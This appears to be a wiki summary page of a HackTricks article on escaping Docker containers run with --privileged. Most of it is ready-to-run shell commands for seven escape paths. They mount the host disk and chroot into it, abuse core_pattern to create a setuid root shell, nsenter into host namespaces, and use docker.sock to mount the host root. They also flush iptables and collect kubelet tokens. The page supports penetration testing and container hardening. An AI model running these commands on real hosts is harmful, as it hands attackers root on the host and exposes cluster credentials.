---
title: "HackTricks — Escaping from Privileged Containers"
tags:
  [
    container-security,
    privilege-escalation,
    docker,
    privileged-containers,
    hacktricks,
  ]
sources: [hacktricks-privileged-containers.md]
updated: 2026-05-01
---

# HackTricks — Escaping from Privileged Containers

Source: [HackTricks](../entities/hacktricks.md)

## Key Takeaways

`--privileged` is not "one or two extra permissions" — it removes most default runtime protections simultaneously. A privileged container usually does **not** need a kernel exploit; it can interact with host devices, kernel filesystems, or runtime interfaces directly.

## What `--privileged` Removes

- All capabilities granted
- Device cgroup restrictions lifted
- Many kernel filesystems stop being read-only
- Default masked procfs paths disappear
- seccomp filtering disabled
- AppArmor confinement disabled
- SELinux isolation disabled / replaced with broader label

**Does NOT automatically join:** host PID, network, IPC, or UTS namespaces.

## Escape Paths

### 1. Mount host block device

```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
fdisk -l 2>/dev/null; blkid 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null
chroot /mnt/hostdisk /bin/bash
```

Prerequisite: `CAP_SYS_ADMIN` + device exposure.

### 2. Existing host bind mount + chroot

```bash
mount | grep -E ' /host| /mnt| /rootfs'
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

If no bind mount exists but privileged, create one:

```bash
mkdir -p /tmp/host && mount --bind / /tmp/host
chroot /tmp/host /bin/bash
```

### 3. Writable `/proc/sys` — core_pattern

```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh && chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
# trigger a crash to execute the handler
```

Also check: `modprobe`, `binfmt_misc`, and broader `/proc/sys` writability:

```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

### 4. Full capabilities → nsenter

```bash
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null
# With --pid=host:
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```

### 5. Runtime sockets

Privileged containers often see host runtime state:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash
```

### 6. Network reconfiguration (with `--network=host`)

`--privileged` does not join host network namespace alone, but combined with `--network=host`:

```bash
iptables -F 2>/dev/null
ip link set lo down 2>/dev/null
```

### 7. Read host secrets / kubelet state

Even without clean shell escape:

```bash
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```

## Quick Checks

```bash
capsh --print
mount | grep -E '/proc|/sys| /host| /mnt'
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
grep Seccomp /proc/self/status       # Confirm seccomp disabled
cat /proc/self/attr/current          # Confirm MAC confinement gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null
```

## Related Pages

- [Container Security](../concepts/container-security.md)
- [Linux Capabilities](../concepts/linux-capabilities.md)
- [HackTricks — Sensitive Host Mounts](hacktricks-sensitive-host-mounts.md)
- [HackTricks — Runtime API and Daemon Exposure](hacktricks-runtime-api-daemon-exposure.md)
- [HackTricks](../entities/hacktricks.md)
